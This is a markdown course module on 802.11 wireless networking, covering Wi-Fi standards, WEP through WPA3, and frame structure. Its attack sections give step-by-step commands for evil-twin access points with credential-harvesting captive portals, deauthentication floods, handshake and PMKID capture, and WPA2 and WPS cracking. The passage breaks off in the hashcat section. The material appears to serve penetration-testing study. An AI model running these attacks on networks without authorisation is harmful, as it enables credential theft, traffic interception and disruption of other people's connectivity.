---
title: "Module 08 — Wireless Networking"
tags: [networking, wireless, wifi, 802.11, wpa2, wpa3, aircrack, hashcat, evil-twin, deauth, pmkid, wps, enterprise-wireless, pentest, netgod]
module: 8
date: 2026-04-05
---

# Module 08 — Wireless Networking

> [!info] Module Overview
> This module covers 802.11 wireless networking from the radio frequency layer through enterprise WLC deployments. Every standard from legacy 802.11b to Wi-Fi 6E, all security protocols from WEP through WPA3, frame-level understanding of beacons and probes, and the complete wireless attack toolkit — evil twin, deauth, PMKID capture, KRACK, WPS brute force. Full aircrack-ng suite syntax with real attack workflows, hashcat for handshake cracking, and enterprise wireless architecture.

---

## 1. 802.11 Standards — Frequencies, Speeds, Channels

### The 802.11 Family

| Standard | Marketing Name | Year | Frequency | Max Throughput | Notes |
|---------|---------------|------|-----------|---------------|-------|
| 802.11 | — | 1997 | 2.4 GHz | 2 Mbps | Original, obsolete |
| 802.11b | Wi-Fi 1 | 1999 | 2.4 GHz | 11 Mbps | DSSS modulation |
| 802.11a | Wi-Fi 2 | 1999 | 5 GHz | 54 Mbps | OFDM, less interference |
| 802.11g | Wi-Fi 3 | 2003 | 2.4 GHz | 54 Mbps | Backward compat with b |
| 802.11n | Wi-Fi 4 | 2009 | 2.4 + 5 GHz | 600 Mbps | MIMO (4×4), channel bonding |
| 802.11ac | Wi-Fi 5 | 2013 | 5 GHz only | 3.5 Gbps (Wave 2) | MU-MIMO, 160 MHz channels |
| 802.11ax | Wi-Fi 6 | 2019 | 2.4 + 5 GHz | 9.6 Gbps | OFDMA, BSS Colouring, TWT |
| 802.11ax | Wi-Fi 6E | 2021 | 2.4 + 5 + 6 GHz | 9.6 Gbps | Adds 6 GHz band (1200 MHz spectrum) |
| 802.11be | Wi-Fi 7 | 2024 | 2.4 + 5 + 6 GHz | 46 Gbps | MLO (Multi-Link Operation) |

**Key terms**:
- **MIMO (Multiple Input Multiple Output)**: Using multiple antennas to transmit/receive simultaneously, increasing throughput
- **MU-MIMO (Multi-User MIMO)**: AP serves multiple clients simultaneously (not sequentially)
- **OFDMA (Orthogonal Frequency Division Multiple Access)**: Wi-Fi 6 feature — divides channel into sub-channels (Resource Units), serves multiple clients per transmission
- **Channel bonding**: Combining two adjacent channels into one wider channel (40 MHz, 80 MHz, 160 MHz) for more throughput

### 2.4 GHz Band

- **Range**: 2.400 – 2.4835 GHz
- **Channels**: 1–14 (varies by country — US: 1–11, UK/EU: 1–13, Japan: 1–14)
- **Channel width**: 20 MHz each, but they overlap significantly
- **Non-overlapping channels**: Only 3 non-overlapping channels exist: **1, 6, 11**

```
Channel 1:  2.401 – 2.423 GHz
Channel 6:  2.426 – 2.448 GHz
Channel 11: 2.451 – 2.473 GHz

Channels 2,3,4,5 overlap with both 1 and 6 → interference → avoid
```

**2.4 GHz characteristics**:
- Better wall penetration and range than 5 GHz
- More congested (Bluetooth, microwave ovens, baby monitors, neighbouring Wi-Fi all compete)
- Lower maximum throughput than 5 GHz
- Supported by all Wi-Fi devices (legacy compatibility)

### 5 GHz Band

- **Range**: 5.150 – 5.850 GHz (varies by country — regulatory rules complex)
- **Channels**: 36–177 (non-contiguous — many channels available)
- **Non-overlapping 20 MHz channels**: Up to 25 in the US
- **Channel bonding**: 40/80/160 MHz wide channels → higher throughput, fewer channels

**Key 5 GHz channels**:
```
UNII-1 (indoor): 36, 40, 44, 48
UNII-2 (indoor/outdoor): 52, 56, 60, 64  ← DFS required
UNII-2 Extended: 100–140               ← DFS required
UNII-3 (outdoor): 149, 153, 157, 161, 165

DFS (Dynamic Frequency Selection): Required channels to avoid interference with radar.
AP must monitor for radar and vacate the channel if detected. Can cause unexpected AP restarts.
```

**5 GHz characteristics**:
- Less congested than 2.4 GHz
- Higher throughput (more channels, wider channels available)
- Shorter range and worse wall penetration than 2.4 GHz
- Not all legacy devices support 5 GHz

### 6 GHz Band (Wi-Fi 6E and Wi-Fi 7)

- **Range**: 5.925 – 7.125 GHz
- **New spectrum**: 1200 MHz of new clean spectrum (no legacy devices, no DFS)
- **Channels**: 59 non-overlapping 20 MHz channels, or 7 non-overlapping 160 MHz channels
- **No legacy interference**: Only Wi-Fi 6E/7 devices operate here
- **Characteristics**: Highest throughput, lowest latency, shortest range

### Modulation and Data Encoding

Understanding modulation is useful for understanding why signals degrade with distance and interference:

- **DSSS (Direct Sequence Spread Spectrum)**: Used by 802.11b. Spreads signal across wide frequency range — robust but slow.
- **OFDM (Orthogonal Frequency Division Multiplexing)**: Used by 802.11a/g/n/ac/ax. Divides channel into many subcarriers (52 for 20 MHz channel). Each subcarrier independently modulated.
- **Modulation schemes**: BPSK (1 bit/symbol) → QPSK (2) → 16-QAM (4) → 64-QAM (6) → 256-QAM (8) → 1024-QAM (10, Wi-Fi 6)
- **MCS (Modulation and Coding Scheme)**: Index from 0–11 defining modulation + coding rate → throughput. Higher MCS = more data but requires stronger signal.

---

## 2. WEP, WPA, WPA2, WPA3 — Security Protocols

### WEP — Wired Equivalent Privacy (1997 — Completely Broken)

WEP was the original 802.11 security protocol. It uses **RC4 stream cipher** with a static 40-bit or 104-bit key, combined with a 24-bit IV (Initialisation Vector) prepended to each packet.

**Why WEP is broken**:
- The 24-bit IV space is too small — with enough traffic, IVs repeat (birthday paradox)
- When IVs repeat with the same key, the keystream is the same → XOR analysis reveals both
- WEP has no integrity protection — ICV (Integrity Check Value) is CRC-32, which is not cryptographically secure
- Tools like aircrack-ng can crack WEP keys with ~40,000 IV captures in seconds

**Do not use WEP under any circumstances. Do not use it even for testing if real devices are connected.**

### WPA — Wi-Fi Protected Access (2003 — Interim Fix)

WPA was designed as an emergency fix for WEP's broken security while 802.11i was being finalised. It uses **TKIP (Temporal Key Integrity Protocol)** which dynamically changes encryption keys per packet — patching the IV reuse problem.

**WPA Security**:
- TKIP changes keys per-packet → eliminates IV reuse
- 48-bit IV instead of 24-bit
- Michael MIC (Message Integrity Code) → integrity protection
- Still RC4 underneath — designed to work on old WEP hardware

**WPA Vulnerabilities**:
- TKIP can be cracked under specific conditions (chopchop/fragmentation attacks)
- Michael MIC is weak — can be exploited to inject packets
- PSK (pre-shared key) mode subject to dictionary attacks against the 4-way handshake

**Current status**: Deprecated. Should not be used.

### WPA2 — Wi-Fi Protected Access 2 (2004 — Current Standard)

WPA2 implements the full **IEEE 802.11i** standard. Replaces TKIP+RC4 with **CCMP (Counter Mode with CBC-MAC Protocol)** using **AES-128**.

**Two modes**:

**WPA2-Personal (WPA2-PSK)**:
- Uses a pre-shared key (password) — same key for all users
- Authentication via 4-way handshake (derives PTK from PSK + ANonce + SNonce)
- Vulnerable to offline dictionary attack if handshake captured
- No per-user identity — all users have the same credential

**WPA2-Enterprise (WPA2-802.1X)**:
- Uses 802.1X with RADIUS server
- Each user has unique credentials (certificate or username/password via EAP)
- No shared key — compromise of one user's credentials doesn't affect others
- MSCHAPv2 inside PEAP is still vulnerable to offline cracking if EAP method is weak

**WPA2 4-Way Handshake**:
```
Client (Supplicant)                      AP (Authenticator)
        |                                       |
        |<──── Message 1: ANonce ───────────────|
        |      AP generates random ANonce        |
        |      and sends to client               |
        |                                       |
        |──── Message 2: SNonce + MIC ──────────>|
        |  Client generates SNonce               |
        |  Client derives PTK from:              |
        |    PTK = PRF(PMK, ANonce, SNonce,      |
        |              AP_MAC, Client_MAC)        |
        |  Client sends SNonce + MIC             |
        |  (MIC proves client knows PMK/PSK)     |
        |                                       |
        |<──── Message 3: GTK + MIC ────────────|
        |  AP derives same PTK (has same inputs) |
        |  AP sends GTK (Group Temporal Key)     |
        |  encrypted with PTK                   |
        |  MIC proves AP knows PMK/PSK          |
        |                                       |
        |──── Message 4: ACK ───────────────────>|
        |  Client confirms GTK received          |
        |                                       |
        |═══════════ Encrypted traffic ══════════|
```

**PMK (Pairwise Master Key)**: Derived from the PSK (password). For PSK mode: `PMK = PBKDF2(PSK, SSID, 4096 iterations, 256 bits)` — the SSID is part of the derivation, which is why the same password on different SSIDs gives different PMKs.

**PTK (Pairwise Transient Key)**: Session key derived from PMK + ANonce + SNonce + both MACs. Used to encrypt traffic between this specific client and AP.

**GTK (Group Temporal Key)**: Used to encrypt broadcast/multicast traffic. Same for all clients on the BSSID.

### WPA3 — Wi-Fi Protected Access 3 (2018 — Current Best Practice)

WPA3 addresses WPA2's key weakness (offline dictionary attack against the handshake) by replacing PSK-based key exchange with **SAE (Simultaneous Authentication of Equals)** — based on Dragonfly key exchange.

**WPA3-Personal (SAE)**:
- **No 4-way handshake with PMK derived from password** → cannot capture and crack offline
- SAE uses a zero-knowledge proof — the password is never transmitted, even in hashed form
- **Perfect Forward Secrecy**: Even if the password is later compromised, past sessions cannot be decrypted (ephemeral keys)
- **Equal authentication**: Both sides authenticate simultaneously (unlike WPA2 where AP doesn't authenticate first)

**WPA3 Transition Mode**: AP supports both WPA2 and WPA3 simultaneously — allows gradual migration. However, transition mode introduces downgrade attack risk (Dragonblood vulnerabilities).

**WPA3-Enterprise**: 192-bit security mode — mandates stronger cipher suites (GCMP-256, AES-256).

**WPA3 Vulnerabilities (Dragonblood — 2019)**:
- Side-channel attacks against SAE implementation → timing/cache attacks reveal password bits
- Downgrade attacks in transition mode → force WPA2 connection
- Most vendors have patched these — but unpatched devices remain vulnerable

**OWE (Opportunistic Wireless Encryption)** — part of WPA3:
- Encrypts open Wi-Fi networks (no password) using Diffie-Hellman
- Passers-by cannot capture and read open Wi-Fi traffic
- No authentication — anyone can connect, but traffic is encrypted uniquely per client

### Management Frame Protection (802.11w)

Without 802.11w, management frames (deauthentication, disassociation) are unauthenticated — any device can send a forged deauth frame and disconnect clients. 802.11w adds cryptographic protection to management frames.

- **WPA2**: 802.11w optional (most deployments don't enable it)
- **WPA3**: 802.11w **mandatory** — deauth attacks don't work against WPA3

---

## 3. Wireless Frames — Beacon, Probe Request/Response, Association

### 802.11 Frame Types

| Type | Subtype Examples | Purpose |
|------|----------------|---------|
| Management (00) | Beacon, Probe Req/Resp, Auth, Assoc Req/Resp, Deauth, Disassoc | Network discovery, joining, leaving |
| Control (01) | RTS, CTS, ACK, Block ACK | Medium access control, flow control |
| Data (10) | Data, QoS Data, Null Data | Actual user data |

### Beacon Frame (Management)

APs broadcast beacon frames at regular intervals (default: 100ms / 10 per second) to announce their presence.

**Beacon frame structure**:
```
802.11 MAC Header:
  Frame Control:     0x0080  (Management frame, subtype 8 = Beacon)
  Duration:          0
  Destination MAC:   FF:FF:FF:FF:FF:FF  (broadcast)
  Source MAC:        AP's BSSID (e.g., AA:BB:CC:DD:EE:01)
  BSSID:             AA:BB:CC:DD:EE:01  (same as AP MAC for infrastructure BSS)
  Sequence Control:  frame number

Fixed Parameters:
  Timestamp:         8 bytes — synchronisation
  Beacon Interval:   0x0064  (100 TU = 100ms)
  Capability Info:   ESS bit set, Privacy bit set (if encrypted)

Tagged Parameters (Information Elements — IEs):
  SSID:              "CorpWiFi"   (or empty for hidden SSID)
  Supported Rates:   54, 48, 36, 24, 18, 12, 9, 6 Mbps
  DS Parameter Set:  Channel 6
  TIM:               Traffic Indication Map (buffered frames for sleeping clients)
  RSN IE:            Security capabilities (WPA2/WPA3, AES-CCMP, SAE/PSK)
  HT Capabilities:   802.11n capabilities (MIMO, channel bonding)
  VHT Capabilities:  802.11ac capabilities
  HE Capabilities:   Wi-Fi 6 capabilities
  Vendor Specific:   Proprietary extensions (Cisco CCX, Microsoft WPS, etc.)
```

**RSN IE (Robust Security Network Information Element)** — the most important element for security analysis:
```
RSN Version: 1
Group Cipher Suite:     00:0F:AC:04  (AES-CCMP)
Pairwise Cipher Count:  1
Pairwise Cipher Suite:  00:0F:AC:04  (AES-CCMP)
AKM Suite Count:        1
AKM Suite:              00:0F:AC:02  (PSK — WPA2-Personal)
                        00:0F:AC:08  (SAE — WPA3-Personal)
                        00:0F:AC:01  (802.1X — WPA2/3-Enterprise)
RSN Capabilities:
  Pre-Auth: 0
  No Pairwise: 0
  PTKSA Replay Counter: 3
  GTKSA Replay Counter: 3
  MFP Required: 1  (802.11w — Management Frame Protection mandatory)
```

**Wireshark filter for beacons**: `wlan.fc.type_subtype == 0x08`

### Probe Request / Response

Used for active network discovery — client sends probe requests, APs respond.

**Probe Request**:
```
Source MAC:      Client's MAC (or randomised MAC — privacy feature)
Destination MAC: FF:FF:FF:FF:FF:FF (broadcast) or specific BSSID
SSID:            "" (empty = wildcard, asking for any AP)
                 or "TargetSSID" (directed probe for specific network)
Supported Rates: What the client can do
```

**Probe Response** (from AP):
- Contains same information as Beacon frame
- Sent to the client's MAC (unicast)

> [!warning] Probe Request Privacy Leak
> Historically, devices sent directed probe requests for every saved network, revealing the SSIDs of every Wi-Fi network the device had ever connected to. This enabled tracking. Modern devices now use randomised MACs for probes and only probe for hidden SSIDs they expect to encounter.

**Wireshark filter**: `wlan.fc.type_subtype == 0x04` (probe request) / `0x05` (probe response)

### Authentication and Association Frames

```
Client Discovery (passive: wait for beacon, or active: send probe)
         ↓
Authentication Exchange (Open System or SAE)
  Client → AP: Authentication Request
  AP → Client: Authentication Response (success/failure)
         ↓
Association
  Client → AP: Association Request
    (Contains: SSID, supported rates, RSN IE with client's security capabilities)
  AP → Client: Association Response
    (Contains: Association ID, AP's full capabilities)
         ↓
4-Way Handshake (WPA2-PSK) or SAE (WPA3)
         ↓
Encrypted Data Exchange
```

### Deauthentication and Disassociation Frames

```
Deauth frame:
  Subtype: 12 (0x0C)
  Destination: Client MAC or FF:FF:FF:FF:FF:FF (kick everyone)
  Reason Code: 1=Unspecified, 3=Deauth because leaving BSS,
               6=Class 2 frame from non-authenticated station,
               7=Class 3 frame from non-associated station

Without 802.11w: ANY device can forge a deauth frame
  → Client believes it was deauthenticated by the AP
  → Client disconnects, re-authenticates
  → If WPA2-PSK: 4-way handshake is retransmitted → captured by attacker
```

---

## 4. Wireless Attacks

### Attack 1: Evil Twin (Rogue AP)

**Concept**: Create an AP with the same SSID as a legitimate network. Trick clients into connecting to it instead of the real AP.

**Types**:
- **Passive Evil Twin**: Simply broadcast the same SSID — wait for clients to connect (may take time as clients prefer known AP BSSIDs)
- **Active Evil Twin**: Deauthenticate clients from the real AP, then broadcast the same SSID — clients reconnect to the strongest signal (usually the rogue AP if it's closer or using higher power)

**Tools**: hostapd-wpe (for capturing WPA2-Enterprise credentials), hostapd + dnsmasq, airbase-ng

```bash
# Install required tools
apt install hostapd dnsmasq

# ─── STEP 1: Put wireless adapter into monitor mode ──────────────────────────
airmon-ng start wlan0
# Creates wlan0mon interface in monitor mode

# ─── STEP 2: Scan for target AP ───────────────────────────────────────────────
airodump-ng wlan0mon
# Note: Target SSID, BSSID (AP MAC), Channel

# ─── STEP 3: Create hostapd configuration ────────────────────────────────────
cat > /tmp/evil_twin.conf << 'EOF'
interface=wlan1              # Use second wireless adapter for AP
driver=nl80211
ssid=TargetSSID              # Same SSID as target
hw_mode=g
channel=6                    # Same channel as target
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=0
EOF

# ─── STEP 4: Set up DHCP server ────────────────────────────────────────────────
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1         # Gateway = attacker
dhcp-option=6,192.168.1.1         # DNS = attacker
address=/#/192.168.1.1             # Resolve all domains to attacker IP (captive portal)
EOF

# Configure interface
ip addr add 192.168.1.1/24 dev wlan1
ip link set wlan1 up

# ─── STEP 5: Enable IP forwarding and optional internet ────────────────────────
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  # Give clients internet (less suspicious)

# ─── STEP 6: Start AP and DHCP ────────────────────────────────────────────────
hostapd /tmp/evil_twin.conf &
dnsmasq -C /tmp/dnsmasq.conf --no-daemon &

# ─── STEP 7: Optional captive portal (credential harvest) ─────────────────────
# Set up nginx serving a fake login page at 192.168.1.1
# Capture POST requests containing credentials

# ─── STEP 8: Deauth clients from real AP ──────────────────────────────────────
# (Covered in deauth attack section below)
```

**hostapd-wpe** — specifically for WPA2-Enterprise evil twin (captures PEAP/MSCHAPv2 credentials):
```bash
# hostapd-wpe patches hostapd to:
# 1. Accept any WPA2-Enterprise client connection
# 2. Capture MSCHAPv2 credentials (even without valid RADIUS cert)
# 3. Log: username + NT challenge-response → crack with asleap or hashcat

apt install hostapd-wpe
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan1
ssid=CorpWiFi
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
EOF

hostapd-wpe /tmp/hostapd-wpe.conf

# Captured credentials appear in /var/log/hostapd-wpe.log:
# jsmith / challenge: 1234... / response: abcd...
# Crack with asleap:
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
# Or hashcat (mode 5500 = NetNTLMv1, mode 5600 = NetNTLMv2)
```

### Attack 2: Deauthentication (Deauth Flood)

Send forged 802.11 deauthentication frames to disconnect clients from the legitimate AP. Used standalone (DoS) or as part of evil twin / handshake capture workflow.

```bash
# aireplay-ng deauth attack
# Target: specific client (most precise)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:01 -c 11:22:33:44:55:66 wlan0mon
# --deauth 10: send 10 deauth frames (0 = continuous)
# -a: AP BSSID (target network)
# -c: Client MAC (target client)

# Deauth all clients from AP (broadcast deauth)
aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:01 wlan0mon
# -c omitted → broadcast deauth → disconnects ALL clients

# mdk4 — more advanced deauth flooding
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:01    # Deauth all from specific BSSID
mdk4 wlan0mon d -c 6                    # Deauth all APs on channel 6

# aireplay-ng with BSSID lock (stays on target channel)
# First: lock your card to the target channel
iwconfig wlan0mon channel 6
# Or use --ignore-negative-one in airodump-ng
```

> [!info] Why Deauth Works Against WPA2
> Without 802.11w (Management Frame Protection), deauth frames are unauthenticated. Any device can send one. When clients reconnect, they perform the 4-way handshake → attacker captures the handshake → offline dictionary attack.
> WPA3 with 802.11w mandatory → deauth frames are authenticated → forged deauths are rejected.

### Attack 3: WPA2 Handshake Capture and Cracking

**Full workflow — from nothing to cracked password**:

```bash
# ─── PHASE 1: SETUP ───────────────────────────────────────────────────────────

# Identify and kill processes that interfere with monitor mode
airmon-ng check kill

# Put adapter in monitor mode
airmon-ng start wlan0
# → creates wlan0mon

# ─── PHASE 2: DISCOVER TARGET ─────────────────────────────────────────────────

# Scan all channels to find target
airodump-ng wlan0mon

# Output:
#  BSSID              PWR  Beacons  #Data  CH  ENC   CIPHER AUTH ESSID
#  AA:BB:CC:DD:EE:01  -67  100      50     6   WPA2  CCMP   PSK  TargetNetwork

# Focus on target AP and capture to file
airodump-ng --bssid AA:BB:CC:DD:EE:01 -c 6 -w /tmp/capture wlan0mon
# --bssid: target AP
# -c 6: channel 6 (lock to target channel)
# -w: write capture files (creates /tmp/capture-01.cap, .csv, .kismet.csv)

# ─── PHASE 3: CAPTURE HANDSHAKE ───────────────────────────────────────────────

# Wait for a client to connect naturally (can take time)
# Or: deauth a connected client to force re-authentication

# Open a second terminal:
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:01 -c 11:22:33:44:55:66 wlan0mon
# Target a specific connected client (from airodump-ng STATION column)

# Watch airodump-ng output for:
# WPA handshake: AA:BB:CC:DD:EE:01  (top right corner)
# This confirms all 4 messages of the handshake were captured

# ─── PHASE 4: VERIFY HANDSHAKE ────────────────────────────────────────────────

# Verify capture contains a valid handshake
aircrack-ng /tmp/capture-01.cap
# Output: "1 handshake" = success
# Or use: cap2hccapx to verify and convert format

# ─── PHASE 5: CRACK THE HANDSHAKE ────────────────────────────────────────────

# Method 1: aircrack-ng (CPU — slow)
aircrack-ng /tmp/capture-01.cap -w /usr/share/wordlists/rockyou.txt
# -w: wordlist file

# Method 2: hashcat (GPU — much faster)
# Convert capture to hashcat format
hcxpcapngtool -o /tmp/capture.hc22000 /tmp/capture-01.cap

# Crack with hashcat
hashcat -m 22000 /tmp/capture.hc22000 /usr/share/wordlists/rockyou.txt
# -m 22000: WPA2 PMKID + Handshake (new unified format)
# -m 22000 replaces the old -m 2500 (WPA-EAPOL-PBKDF2)

# With rules (mangling — variations of each word)
hashcat -m 22000 /tmp/capture.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# With mask (brute force — e.g., 8-digit number: 00000000-99999999)
hashcat -m 22000 /tmp/capture.hc22000 -a 3 ?d?d?d?d?d?d?d?d
# -a 3: mask attack, ?d = digit 0-9

# Check progress
hashcat -m 22000 /tmp/capture.hc22000 --status

# View cracked passwords
hashcat -m 22000 /tmp/capture.hc22000 --show
```

### Attack 4: PMKID Attack (No Client Needed)

The PMKID attack (discovered 2018 by Jens Steube — hashcat author) captures a **PMKID from the first EAPOL message** without needing a connected client or waiting for the handshake.

**Why it works**:
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)

The AP sends PMKID in the first EAPOL message (RSNIE).
The attacker can derive PMK candidates from password guesses and compute expected PMKID.
If PMKID matches → password found.
```

```bash
# ─── Tool: hcxdumptool ────────────────────────────────────────────────────────

# Install
apt install hcxtools hcxdumptool

# Start PMKID capture (no deauth needed — sends a single frame to AP)
hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --enable_status=1
# Runs continuously — captures PMKIDs from all nearby WPA2/WPA3 APs

# Target specific AP
hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng \
  --filterlist_ap=/tmp/target_bssid.txt \   # File with target BSSID
  --filtermode=2 \                           # 2 = include only listed APs
  --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng

# Crack
hashcat -m 22000 /tmp/pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# ─── Advantages over handshake capture ───────────────────────────────────────
# No need to wait for or deauthenticate a client
# Works even when no clients are connected to the AP
# More reliable (no timing issues with handshake capture)
# Single EAPOL frame = faster
```

### Attack 5: KRACK — Key Reinstallation Attack (CVE-2017-13077)

KRACK exploits a flaw in the WPA2 4-way handshake implementation. When Message 3 of the handshake is lost/delayed, the standard allows it to be retransmitted. An attacker can replay Message 3 multiple times, causing the client to reinstall an already-in-use key — resetting the nonce counter. With a known nonce, the keystream can be derived → decrypt or inject traffic.

**Impact**:
- Affects WPA2-PSK and WPA2-Enterprise
- Can decrypt/replay/forge packets against vulnerable clients
- Android 6.0 was particularly vulnerable (reinstalled all-zero key)

**Current status**: Patched in all major OSes. Check for unpatched embedded/IoT devices.

**Detection**:
```bash
# Check if a device has been patched (from the device)
# Android: Settings → About Phone → Security Patch Level → must be after October 2017
# Windows: KB4041676 or later
# Linux: check kernel version + wpa_supplicant version 2.6 or later
```

### Attack 6: WPS PIN Brute Force

WPS (Wi-Fi Protected Setup) allows easy device pairing via an 8-digit PIN. The PIN is checked in two halves (4+4 digits) independently — only 10,000 + 10,000 = 11,000 possible values (not 100,000,000).

**Reaver / Bully** — automated WPS PIN brute force:
```bash
# Install
apt install reaver bully

# Scan for WPS-enabled APs
wash -i wlan0mon                       # wash lists WPS-enabled APs
wash -i wlan0mon -C                    # Ignore FCS errors (useful for non-target traffic)
# Output: BSSID, Channel, RSSI, WPS Locked, WPS Version, ESSID

# Brute force WPS PIN with Reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:01 -c 6 -vv
# -i: monitor mode interface
# -b: target BSSID
# -c: channel
# -vv: verbose (show each PIN attempt)

# With delay to avoid lockout
reaver -i wlan0mon -b AA:BB:CC:DD:EE:01 -c 6 -d 5 -r 3:15
# -d 5: 5 second delay between attempts
# -r 3:15: sleep 15 seconds after every 3 attempts

# Bully (alternative — better against some implementations)
bully wlan0mon -b AA:BB:CC:DD:EE:01 -c 6 -d 1

# Pixie Dust attack (offline WPS attack — works against weak nonce implementations)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:01 -c 6 -K 1 -vv
# -K 1: enable Pixie Dust attack (much faster against vulnerable APs — seconds not hours)
```

**WPS Mitigation**: Disable WPS entirely on all APs. Most modern enterprise APs have it disabled by default.

---

## 5. aircrack-ng Suite — Complete Reference

### airmon-ng — Monitor Mode Management

```bash
# Check for interfering processes
airmon-ng check

# Kill interfering processes (NetworkManager, wpa_supplicant, dhclient)
airmon-ng check kill

# Start monitor mode
airmon-ng start wlan0            # Creates wlan0mon
airmon-ng start wlan0 6          # Monitor mode locked to channel 6

# Stop monitor mode (return to managed mode)
airmon-ng stop wlan0mon

# Verify mode
iwconfig wlan0mon                # Should show Mode: Monitor
iw wlan0mon info                 # Detailed interface info

# Set channel manually
iwconfig wlan0mon channel 11
iw wlan0mon set channel 11
```

### airodump-ng — Packet Capture and Network Discovery

```bash
# Basic scan (all channels, all bands)
airodump-ng wlan0mon

# Filter to specific band
airodump-ng --band a wlan0mon    # 5 GHz only
airodump-ng --band bg wlan0mon   # 2.4 GHz only
airodump-ng --band abg wlan0mon  # All bands

# Target specific AP (channel + BSSID)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:01 -w /tmp/capture wlan0mon

# Multiple channels
airodump-ng -c 1,6,11 wlan0mon

# Output columns:
# BSSID:    AP MAC address
# PWR:      Signal strength (higher = closer/stronger) — negative dBm (-30 best, -90 weakest)
# Beacons:  Number of beacon frames seen
# #Data:    Data packets (activity indicator)
# #/s:      Data packets per second
# CH:       Channel
# MB:       Maximum data rate supported
# ENC:      Encryption (OPN/WEP/WPA/WPA2/WPA3)
# CIPHER:   CCMP/TKIP/WEP
# AUTH:     PSK/MGT/SAE
# ESSID:    Network name (or <length: 0> for hidden)

# Station columns (bottom half):
# BSSID:    AP this station is associated with
# STATION:  Client MAC
# PWR:      Signal from client to adapter
# Rate:     Tx-Rx rate
# Lost:     Frames lost
# Frames:   Frames seen from client
# Probe:    SSIDs this client is probing for
```

### aireplay-ng — Packet Injection and Attack Modes

```bash
# Test injection capability (must inject before attacks work)
aireplay-ng --test wlan0mon
aireplay-ng --test -b AA:BB:CC:DD:EE:01 wlan0mon  # Test against specific AP

# Attack modes:
# -0: Deauthentication
# -1: Fake Authentication
# -2: Interactive Packet Replay
# -3: ARP Request Replay (WEP cracking)
# -4: KoreK chopchop (WEP)
# -5: Fragmentation (WEP)
# -6: Café-latte (WEP)
# -9: Injection test

# Deauthentication (most used in WPA attacks)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:01 wlan0mon              # 10 deauths, broadcast
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:01 -c 11:22:33:44:55:66 wlan0mon  # Targeted

# Fake Authentication (associate with AP without knowing key — for WEP ARP replay)
aireplay-ng -1 0 -e TargetSSID -a AA:BB:CC:DD:EE:01 -h 00:11:22:33:44:55 wlan0mon
# -1: fake auth, 0: reassoc timing, -e SSID, -a AP BSSID, -h your/spoofed MAC

# ARP Request Replay (WEP cracking — generate IVs rapidly)
aireplay-ng -3 -b AA:BB:CC:DD:EE:01 -h 00:11:22:33:44:55 wlan0mon
# Captures ARP requests and replays them → AP encrypts with new IV each time
# Run alongside airodump-ng -w to capture all IVs for aircrack-ng
```

### aircrack-ng — Key Cracking

```bash
# Crack WEP (after capturing sufficient IVs via ARP replay — typically ~40,000)
aircrack-ng /tmp/capture-01.cap
# Automatic — detects WEP and tries statistical attack

# Crack WPA2 handshake with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap

# Multiple capture files
aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap /tmp/capture-02.cap

# Specify BSSID (if multiple networks in capture)
aircrack-ng -b AA:BB:CC:DD:EE:01 -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap

# Output when cracking WPA2:
# Aircrack-ng 1.6
# [00:00:05] 51234/9822769 keys tested (10034.56 k/s)
# KEY FOUND! [ Password123 ]
# Master Key     : AA BB CC DD ...
# Transient Key  : 11 22 33 44 ...
```

### airdecap-ng — Decrypt Captured Traffic

```bash
# Decrypt WPA2 capture once key is known
airdecap-ng -p Password123 -e TargetSSID /tmp/capture-01.cap
# Creates /tmp/capture-01-dec.cap — decrypted version

# Decrypt WEP
airdecap-ng -w AABBCCDDEEFF /tmp/wep_capture-01.cap    # -w = WEP key in hex

# Open (no encryption) — strip 802.11 header to get raw Ethernet
airdecap-ng -l /tmp/open_capture-01.cap
```

### airgraph-ng — Visualise Wireless Topology

```bash
# Generate graph of AP-Client relationships from airodump-ng CSV
airgraph-ng -i /tmp/capture-01.csv -g CAPR -o /tmp/client_ap.png
# CAPR = Client to AP Relationships

airgraph-ng -i /tmp/capture-01.csv -g CPG -o /tmp/probe_graph.png
# CPG = Common Probe Graph (which clients probe for which SSIDs)
```

---

## 6. hashcat for WPA Handshake Cracking

### hashcat Modes for Wireless

| Mode | Name | Use Case |
|------|------|---------|
| 22000 | WPA-PBKDF2-PMKID+EAPOL | Combined PMKID and handshake (current standard) |
| 2500 | WPA-EAPOL-PBKDF2 | Legacy handshake format (deprecated) |
| 2501 | WPA-EAPOL-PMK | Pre-computed PMK attack |
| 5500 | NetNTLMv1 | PEAP/MSCHAPv1 from WPA2-Enterprise |
| 5600 | NetNTLMv2 | PEAP/MSCHAPv2 from WPA2-Enterprise |

### hashcat Attack Modes

```bash
# -a 0: Dictionary attack (wordlist)
hashcat -m 22000 /tmp/capture.hc22000 /usr/share/wordlists/rockyou.txt

# -a 0 with rules (modify each word in the wordlist)
